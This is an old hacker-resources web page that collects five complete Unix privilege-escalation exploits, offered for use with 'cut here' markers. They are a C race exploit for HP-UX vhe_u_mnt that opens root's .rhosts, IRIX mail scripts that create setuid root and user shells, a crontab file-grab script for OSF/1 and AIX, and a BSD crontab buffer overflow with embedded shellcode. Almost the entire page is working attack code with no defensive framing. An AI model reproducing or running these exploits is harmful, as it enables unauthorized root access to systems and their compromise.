<HTML>
<HEAD>
<TITLE>Atomicfrog.com - Hacker Resources - Apendix 5</TITLE>
</HEAD>
<BODY TEXT="#d0d0d0" LINK="#00ff00"" VLINK="#808080" BGCOLOR="#000000">
<B><FONT SIZE=+1>Other Unix Exploits</FONT></B>&nbsp;<BR><BR>Topics:<BR><A HREF="#1">HP-UX Root vhe_u_mnt Exploit</A><BR><A HREF="#2">IRIX Root Mail Exploit</A><BR><A HREF="#3">Root Cron Grabber - Crontab Exploit for OSF/1, AIX 3.2.5,Digital UNIX</A><BR><
A HREF="#4">IRIX Mail Exploit to Make You Any User On The Mahine - BUTNOT root</A><BR><A HREF="#5">The Root BSD crontab Exploit</A><BR><BR><BR><A NAME="1"></A><B><FONT SIZE=+1>HP-UX Root vhe_u_mnt Exploit</FONT></B><BR><BR>------- cut here<BR><BR>/***<BR>
&nbsp;*<BR>&nbsp;* HP-UX /usr/etc/vhe/vhe_u_mnt bug exploit.<BR>&nbsp;*<BR>&nbsp;* This bug is exhibited in all versions of HP-UX that contain<BR>&nbsp;* /usr/etc/vhe/vhe_u_mnt setuid to root.<BR>&nbsp;*<BR>&nbsp;* This program written by pluvius@io.org<B
R>&nbsp;* The exploit code itself written by misar@rbg.informatik.th-darmstadt.de<BR>&nbsp;*<BR>&nbsp;* I found that the exploit code didn't always work due to a racebetween<BR>&nbsp;* the child and the parent, and that a link() called failed due to<BR>&n
bsp;* the fact that user directories and the /tmp are in different filesystems<BR>&nbsp;* so you must create a symlink.<BR>&nbsp;* I added in a call to alarm() so that the timing between the twoprocesses<BR>&nbsp;* is ok..<BR>&nbsp;*<BR>&nbsp;***/<BR>#inc
lude &lt;stdio.h><BR>#include &lt;stdlib.h><BR>#include &lt;pwd.h><BR>#include &lt;string.h><BR>#include &lt;unistd.h><BR>#include &lt;signal.h><BR>#include &lt;netdb.h><BR>#include &lt;sys/wait.h><BR>#include &lt;sys/stat.h><BR>#include &lt;sys/utsname.h
><BR><BR>#define BUGGY_PROG "/usr/etc/vhe/vhe_u_mnt"<BR>#define NAME "&lt;defunct>"<BR><BR>int test_host()<BR>{ struct utsname name;<BR>&nbsp;&nbsp; uname(&amp;name);<BR>&nbsp;&nbsp; return !strcmp(name.sysname,"HP-UX");<BR>}<BR>int check_mount()<BR>{ str
uct stat my_buf;<BR>&nbsp;&nbsp; if (stat(BUGGY_PROG, &amp;my_buf))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;<BR>&nbsp;&nbsp; return !((my_buf.st_mode &amp; S_ISUID) != S_ISUID);<BR>}<BR>void pause_handler()<BR>{<BR>&nbsp;&nbsp; signal(SIGALRM,pause_han
dler);<BR>}<BR>int rhost_user(user)<BR>char *user;<BR>{<BR>&nbsp; struct passwd *info;<BR>&nbsp; char&nbsp;&nbsp; homedir[80];<BR>&nbsp; int fd[2];<BR>&nbsp; int procno;<BR>&nbsp; struct stat my_buf;<BR>&nbsp; int fsize;<BR><BR>&nbsp;&nbsp; info = getpwna
m(user);<BR>&nbsp;&nbsp; if (info==NULL) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stderr,"ERROR: Unknown user %s\n",user);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(-3);<BR>&nbsp;&nbsp; }<BR>&nbsp;&nbsp; strcpy(homedir,info->pw_dir);<BR>&nbsp;&nbsp; if (h
omedir[strlen(homedir)-1] != '/')<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strcat(homedir,"/");<BR>&nbsp;&nbsp; strcat(homedir,".rhosts");<BR><BR>&nbsp;&nbsp; signal(SIGALRM,pause_handler);<BR>&nbsp;&nbsp; memset(my_buf,0,sizeof(my_buf));<BR>&nbsp;&nbsp; stat(ho
medir,&amp;my_buf);<BR>&nbsp;&nbsp; fsize = my_buf.st_size;<BR><BR>&nbsp;&nbsp; /* now the exploit code... slightly modified.. but mostlyfrom the source */<BR>&nbsp;&nbsp; /* by misar@rbg.informatik.th-darmstadt.de&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/<BR>&nbsp;&nbsp; pipe(fd);<BR>&nbsp;&nbsp; if (!(procno=fork())) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(0
);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dup(fd[0]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(fd[1]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(1);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(2);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alarm(2); /* wait for other process 
*/<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nice(5);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; execl(BUGGY_PROG,NAME,NULL);<BR>&nbsp;&nbsp; } else {<BR>&nbsp;&nbsp;&nbsp; FILE *out;<BR>&nbsp;&nbsp;&nbsp; char listfile[25];<BR>&nbsp;&nbsp;&nbsp; char mntfile[25];<BR>&nbs
p;&nbsp;&nbsp; struct stat dummy;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(1);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dup(fd[1]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(fd[0]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; write(1,"+\n",2);<BR>&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp; sprintf(listfile,"/tmp/vhe_%d",procno+2);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sprintf(mntfile,"/tmp/newmnt%d",procno+2);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while (stat(listfile,&amp;dummy));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; unlink(listfile);<BR>&nbsp
;&nbsp;&nbsp;&nbsp;&nbsp; out=fopen(listfile,"w");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fputs("+ +\n",out);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fclose(out);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; unlink(mntfile);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; symlink(homedir,mn
tfile);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; waitpid(procno,NULL,0);<BR>&nbsp;&nbsp; }<BR>&nbsp;&nbsp; stat(homedir,&amp;my_buf);<BR>&nbsp;&nbsp; return (fsize != my_buf.st_size);<BR>}<BR><BR>void main(argc,argv)<BR>int&nbsp;&nbsp; argc;<BR>char *argv[];<BR>
{<BR>&nbsp; int i;<BR>&nbsp; int rhost_root = 0;<BR>&nbsp; char userid[10];<BR><BR>&nbsp;&nbsp; if (!test_host()) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stderr,"ERROR: This bug is onlyexhibited by HP-UX\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(-1)
;<BR>&nbsp;&nbsp; }<BR><BR>&nbsp;&nbsp; if (!check_mount()) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stderr,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"ERROR: %s must exist and be setuid root to exploit this bug\n
",<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BUGGY_PROG);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(-2);<BR>&nbsp;&nbsp; }<BR><BR>&nbsp;&nbsp; for (i=0;(i&lt;5)&amp;&amp;(!rhost_root);i++) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&
nbsp; fprintf(stderr,"Attempting to .rhosts userroot..");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!rhost_user("root")) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stderr,"failed.\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else {<BR>&nbsp;&nb
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stderr,"succeeded\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rhost_root = 1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp; }<BR><BR>&nbsp;&nbsp; if (!rhost_root) {<BR>&nbsp;&nbsp;&nbsp;&n
bsp;&nbsp; /* failed to rhost root, try user 'bin'*/<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stderr,"Too many failures.. tryinguser bin...");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!rhost_user("bin")) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 fprintf(stderr,"failed.\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(-4);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stderr,"succeeded.\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strcpy(userid,"bin");<BR>&n
bsp;&nbsp; } {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strcpy(userid,"root");<BR>&nbsp;&nbsp; }<BR>&nbsp;&nbsp; fprintf(stderr,"now type: \"remsh localhost -l %s csh -i\"to login\n",<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; userid);<BR>}<
BR><BR>--------- cut here<BR><BR><A NAME="2"></A><B><FONT SIZE=+1>IRIX Root Mail Exploit</FONT></B><BR><BR><BR>---------- cut here<BR><BR>#!/bin/sh<BR>MAIL="/bin/mail"<BR>RM="/bin/rm -f"<BR>CC="/usr/bin/cc"<BR>OS="IRIX"<BR><BR>if&nbsp; [ ".`uname -s`" != 
".$OS" ];&nbsp; then<BR>&nbsp; echo "this box is not running $OS !"<BR>&nbsp; exit 1<BR>fi<BR>echo "creating rewt.c"<BR>cat >rewt.c &lt;&lt;'EOF'<BR>main()<BR>{<BR>setuid(0);<BR>setgid(0);<BR>system("/bin/sh -i");<BR>}<BR>EOF<BR>echo "compiling..."<BR>$CC
 -o rewt rewt.c<BR>if [ -f rewt ]; then<BR>&nbsp; echo "done"<BR>&nbsp; $RM rewt.c<BR>else<BR>&nbsp; echo "unable to compile rewt.c"<BR>&nbsp; $RM rewt.c<BR>&nbsp; exit 1<BR>fi<BR># make dummy mail file for -f<BR>echo "making dummy mail file"<BR>cat >dumm
ymail &lt;&lt;'EOF'<BR>From mr.haqr@bogus.host.edu Sun Oct 30 00:00:00 1994<BR>Return-Path: &lt;/dev/null><BR>Message-Id: &lt;m0r1RBj-0003gkC@bogus.host.edu><BR>From: mr.haqr (Mr. Haqr)<BR>Subject: Irix is secure!!@#%$^<BR>To: root (root)<BR>Date: Sun, 30
 Oct 1994 00:00:00<BR><BR>gimme sum rewt d00d!<BR>&lt;insert l0ck motd here><BR><BR>EOF<BR>echo "running $MAIL, type '!rewt' to get root, exit&nbsp; with 'exit' andthen 'q'"<BR>$MAIL -f dummymail<BR>echo "deleting evil files"<BR>$RM dummymail rewt rewt.c<
BR><BR>exit 0<BR><BR>----------- cut here<BR><BR><A NAME="3"></A><B><FONT SIZE=+1>Root Cron Grabber - Crontab Exploit forOSF/1, AIX 3.2.5, Digital UNIX</FONT></B><BR><BR>[crongrab] [public release]<BR><BR>Crontab has a bug.&nbsp; You run crontab -e, then 
you goto a shell, relinkthe<BR>temp fire that crontab is having you edit, and presto, it is now your<BR>property.&nbsp; This bug has been confirmed on various versions of OSF/1,Digital<BR>UNIX 3.x, and AIX 3.x<BR><BR>If, while running my script, you someh
ow manage to mangle up your whole<BR>system, or perhaps do something stupid that will place you in jail, then<BR>neither I, nor sirsyko, nor the other fine folks of r00t are responsible.<BR><BR>Personally, I hope my script eats your cat and causes swarms 
of locusesto<BR>decend down upon you, but I am not responsible if they do.<BR><BR>--kmem.<BR><BR>[-- Script kiddies cut here -- ]<BR>#!/bin/sh<BR>&nbsp;<BR># This bug was discovered by sirsyko Thu Mar 21 00:45:27 EST 1996<BR># This crappy exploit script w
as written by kmem.<BR># and remember if ur not owned by r00t, ur not worth owning<BR>#<BR># usage: crongrab &lt;file_to_grab> &lt;destination><BR>&nbsp;<BR>echo Crontab exploit for OSF/1, AIX 3.2.5, Digital UNIX, others???<BR>echo if this did not work on
 OSF/1 read the comments -- it is easy to fix.<BR>&nbsp;<BR>if [ $# -ne '2' ]; then<BR>&nbsp;echo "usage: $0 &lt;file_to_grab> &lt;destination>"<BR>&nbsp;exit<BR>fi<BR>&nbsp;<BR>HI_MUDGE=$1<BR>YUMMY=$2<BR>export HI_MUDGE<BR>&nbsp;<BR>UNAME=`uname`<BR>GIRL
IES="1.awk aix.sed myedit.sh myedit.c .r00t-tmp1"<BR>&nbsp;<BR>#SETUP the awk script<BR>cat >1.awk &lt;&lt;END<BR>{<BR>new= i%2<BR>if (new == 0) print \$0<BR>i++<BR>}<BR>END<BR>&nbsp;<BR>cat >aix.sed &lt;&lt;END<BR>/^crontab:/d<BR>/^$/d<BR>END<BR>&nbsp;<B
R>#shell script<BR>cat >myedit.sh &lt;&lt;EDITOR_END<BR>#!/bin/ksh<BR>&nbsp;<BR>rm \$1<BR>ln -s \$HI_MUDGE \$1<BR>exit<BR>EDITOR_END<BR>&nbsp;<BR>chmod 700 myedit.sh<BR>&nbsp;<BR>#save old vars<BR>oldedit=$EDITOR<BR>oldvis=$VISUAL<BR>VISUAL=./myedit.sh<BR
>EDITOR=./myedit.sh<BR>export EDITOR<BR>export VISUAL<BR>&nbsp;<BR>#do the exploit@!&amp;*&amp;*(!@*(&amp;<BR>&nbsp;<BR>if [ $UNAME = "AIX" ]; then<BR>&nbsp;crontab -e 2>.r00t-tmp1<BR>&nbsp;sed -f aix.sed .r00t-tmp1 > $YUMMY<BR>elif [ $UNAME =&nbsp; "OSF1
" ]; then<BR>&nbsp;#FOR DIGITAL UNIX 3.X or higher machines uncomment these 2 lines<BR>&nbsp;crontab -e 2>.r00t-tmp1<BR>&nbsp;awk -f 1.awk .r00t-tmp1 >$YUMMY<BR>&nbsp;# FOR PRE DIGITAL UNIX 3.X machines uncomment this line<BR>&nbsp;#crontab -l 2>&amp;1 > 
$YUMMY<BR>else<BR>&nbsp;echo "Sorry, dont know your OS. But you are a bright boy, read theskript and"<BR>&nbsp;echo "Figger it out."<BR>&nbsp;exit<BR>fi<BR>&nbsp;<BR>echo "Checkit out&nbsp; - $YUMMY"<BR>echo "sirsyko and kmem kickin it out."<BR>echo "r00t
"<BR>&nbsp;<BR>#cleanup our mess<BR>crontab -r<BR>VISUAL=$oldvis<BR>EDITOR=$oldedit<BR>HI_MUDGE=''<BR>YUMMY=''<BR>export HI_MUDGE<BR>export YUMMY<BR>export VISUAL<BR>export EDITOR<BR>rm -f $GIRLIES<BR><BR>------------- cut here<BR><BR><BR><A NAME="4"></A>
<B><FONT SIZE=+1>IRIX Mail Exploit to Make You Any UserOn The Mahine - BUT NOT root</FONT></B><BR><BR><BR>----------- cut here<BR><BR>[irixmksh] [public release]<BR><BR>There are bugs in the IRIX mail proggies.&nbsp; This sample script exploitsthem<BR>to 
give you an suid shell of any user on the system, EXCEPT, for uid=0.<BR><BR>Obviously, this script should not be run if you are a clueless script kiddie<BR>and have no clue what is going to do.&nbsp; If this script causes any sortof<BR>harm to you, physic
ally or virtually, them members of r00t are not responsible,<BR>and in fact will probably laugh at you.<BR><BR>r00t -- you may not like us, but your girlfriend does.<BR><BR>Script kiddies cut here<BR>-------------------------------------------------------
--------------------<BR>#!/sbin/ksh<BR># usage: irixmksh &lt;user> - creates an suid shell of any user on thesystem<BR># except for uid=0<BR><BR>FILES=qfAA12345 putq /tmp/x usr<BR><BR>if [ "x`uname -s`" != "xIRIX" ];then<BR>&nbsp; echo "this box is not ru
nning IRIX - later..."<BR>&nbsp; exit 1<BR>fi<BR><BR>if [ "$#" != "1" ]; then<BR>&nbsp; echo "Usage: $0 &lt;non uid=0 user>"<BR>&nbsp; exit 1<BR>fi<BR><BR>TargetUser=$1<BR><BR># Make the mail queue files<BR>cat &lt;&lt;_r00t-text_>qfAA12345<BR>P0<BR>T8308
96940<BR>DdfAA12345<BR>Bblah<BR>Mdeferred: just cuz...<BR>C$TargetUser<BR>Sroot<BR>R&lt;"|/tmp/x"><BR>H?P?return-path: &lt;root><BR>H?D?date: Tue, 30 Feb 1996 12:34:56 -0400<BR>H?F?from: root (root)<BR>Hreceived: by hackerz.dom (HackerOS/UCB 5.64/Hackerz 
Domain<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; id AA12345 for root@hackerz.com;Tue, 30 Feb 1996 12:34:56 -0400<BR>H?M?message-id: &lt;9602301234.AA12345@localhost><BR>Happarently-to: root@plato.coolcode.com<BR>_r00t-text_<BR><BR><BR># Make the scrip
t to run with euid=mail<BR>cat&lt;&lt;_r00t-text_>putq<BR>#!/bin/sh<BR>cp qfAA12345 /usr/spool/mqueue<BR>touch /usr/spool/mqueue/dfAA12345<BR>chown root /usr/spool/mqueue/*5<BR>_r00t-text_<BR>chmod u+x putq<BR><BR># Make the script to create the suid shel
l<BR>cat&lt;&lt;_r00t-text_>/tmp/x<BR>#!/bin/sh<BR>cp /bin/sh /tmp/b00sh.$TargetUser<BR>chmod 6777 /tmp/b00sh.$TargetUser<BR>_r00t-text_<BR>chmod u+x /tmp/x<BR>chown $TargetUser /tmp/x<BR><BR># Make the script to grab suid mail shell<BR>cat&lt;&lt;_r00t-t
ext_>usr<BR>#!/bin/sh<BR>chgrp mail b00sh-mail<BR>chmod 2777 b00sh-mail<BR>_r00t-text_<BR>chmod u+x usr<BR><BR># Now snag mail access and send the queue files.<BR>cp /bin/sh b00sh-mail<BR>export PATH=.:$PATH<BR>export IFS=/<BR>echo "blah" | rmail $LOGNAME
<BR>export IFS=<BR><BR>b00sh-mail putq<BR>mailq<BR><BR># Clean Up:<BR>rm $FILES<BR><BR><BR><A NAME="5"></A><B><FONT SIZE=+1>The Root BSD crontab Exploit</FONT></B><BR><BR><BR>/*<BR>** BSDI/FreeBSD exploit for crontab<BR>**<BR>** For BSDi (Tested in 2.1) t
he default offset should be OK<BR>** For FreeBSD, the offset seems to be around 1000<BR>**<BR>** I didn't find this hole, I only exploited it.<BR>**<BR>** Brian Mitchell brian@saturn.net<BR>*/<BR>&nbsp;<BR>#include &lt;stdio.h><BR>#include &lt;sys/types.h
><BR>#include &lt;stdlib.h><BR>#include &lt;fcntl.h><BR>#include &lt;unistd.h><BR>&nbsp;<BR>#define DEFAULT_OFFSET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-1050<BR>#define BUFFER_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp
;&nbsp;&nbsp;100&nbsp;&nbsp;&nbsp;&nbsp; /* MAX_TEMPSTR is 100 */<BR>#define HAPPY_FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"./Window"<BR>&nbsp;<BR>long get_esp(void)<BR>{<BR>&nbsp;&nbsp; __asm__("movl %esp,%eax\n"
);<BR>}<BR>&nbsp;<BR>main(int argc, char **argv)<BR>{<BR>&nbsp;&nbsp; int fd;<BR>&nbsp;&nbsp; char *buff = NULL;<BR>&nbsp;&nbsp; unsigned long *addr_ptr = NULL;<BR>&nbsp;&nbsp; char *ptr = NULL;<BR>&nbsp;<BR>&nbsp;&nbsp; char execshell[] =<BR>&nbsp;&nbsp;
 "\xeb\x23"<BR>&nbsp;&nbsp; "\x5e"<BR>&nbsp;&nbsp; "\x8d\x1e"<BR>&nbsp;&nbsp; "\x89\x5e\x0b"<BR>&nbsp;&nbsp; "\x31\xd2"<BR>&nbsp;&nbsp; "\x89\x56\x07"<BR>&nbsp;&nbsp; "\x89\x56\x0f"<BR>&nbsp;&nbsp; "\x89\x56\x14"<BR>&nbsp;&nbsp; "\x88\x56\x19"<BR>&nbsp;&n
bsp; "\x31\xc0"<BR>&nbsp;&nbsp; "\xb0\x3b"<BR>&nbsp;&nbsp; "\x8d\x4e\x0b"<BR>&nbsp;&nbsp; "\x89\xca"<BR>&nbsp;&nbsp; "\x52"<BR>&nbsp;&nbsp; "\x51"<BR>&nbsp;&nbsp; "\x53"<BR>&nbsp;&nbsp; "\x50"<BR>&nbsp;&nbsp; "\xeb\x18"<BR>&nbsp;&nbsp; "\xe8\xd8\xff\xff\x
ff"<BR>&nbsp;&nbsp; "/bin/sh"<BR>&nbsp;&nbsp; "\x01\x01\x01\x01"<BR>&nbsp;&nbsp; "\x02\x02\x02\x02"<BR>&nbsp;&nbsp; "\x03\x03\x03\x03"<BR>&nbsp;&nbsp; "\x9a\x04\x04\x04\x04\x07\x04";<BR>&nbsp;<BR>&nbsp;<BR>&nbsp;<BR>/*<BR>&nbsp;* The sscanf line reads for
 'name' as %[^ =].&nbsp; Neither a space,nor<BR>&nbsp;* a '=' character appears below<BR>&nbsp;*/<BR>&nbsp;<BR>&nbsp;<BR>&nbsp;&nbsp; int i;<BR>&nbsp;&nbsp; int ofs = DEFAULT_OFFSET;<BR>&nbsp;<BR>&nbsp;&nbsp; /* if we have a argument, use it as offset, el
se use default*/<BR>&nbsp;&nbsp; if(argc == 2)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ofs = atoi(argv[1]);<BR>&nbsp;&nbsp; else if (argc > 2) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stderr, "egg [offset]\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(-1);<BR>
&nbsp;&nbsp; }<BR>&nbsp;&nbsp; /* print the offset in use */<BR>&nbsp;&nbsp; printf("Using offset of esp + %d (%x)\n", ofs, get_esp()+ofs);<BR>&nbsp;<BR>&nbsp;&nbsp; buff = malloc(4096);<BR>&nbsp;&nbsp; if(!buff)<BR>&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nb
sp;&nbsp; printf("can't allocate memory\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp;&nbsp; }<BR>&nbsp;&nbsp; ptr = buff;<BR>&nbsp;&nbsp; /* fill start of buffer with nops */<BR>&nbsp;&nbsp; memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));<BR
>&nbsp;&nbsp; ptr += BUFFER_SIZE-strlen(execshell);<BR>&nbsp;&nbsp; /* stick asm code into the buffer */<BR>&nbsp;&nbsp; for(i=0;i &lt; strlen(execshell);i++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *(ptr++) = execshell[i];<BR>&nbsp;<BR>&nbsp;&nbsp; addr_ptr = 
(unsigned long *)ptr;<BR>&nbsp;&nbsp; for(i=0;i &lt; (878/4);i++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *(addr_ptr++) = get_esp() + ofs;<BR>&nbsp;&nbsp; ptr = (char *)addr_ptr;<BR>&nbsp;&nbsp; *ptr++ = '=';<BR>&nbsp;&nbsp; *ptr++ = 'X';<BR>&nbsp;&nbsp; *ptr++
 = '\n';<BR>&nbsp;&nbsp; *ptr = 0;<BR>&nbsp;&nbsp; printf("Writing to %s\n", HAPPY_FILE);<BR>&nbsp;<BR>/*<BR>&nbsp;* The sleep is required because as soon as crontab opens the tmpfile it<BR>&nbsp;* stat's and saves it.&nbsp; After the EDITOR program exist
s it statsagain<BR>&nbsp;* and if they are equal then it assumes changes weren't made andexits.<BR>&nbsp;*/<BR>&nbsp;&nbsp; fd = open(HAPPY_FILE, O_WRONLY|O_CREAT, 0666);<BR>&nbsp;&nbsp; write (fd, buff, strlen(buff));<BR>&nbsp;<BR>&nbsp;&nbsp; close(fd);
<BR>&nbsp;<BR>&nbsp;&nbsp; execl("/usr/bin/crontab","crontab",HAPPY_FILE,NULL);<BR>&nbsp;&nbsp; /* Successful completion */<BR>&nbsp;&nbsp; exit(0);<BR>}<BR>----------- cut here</BODY></HTML>
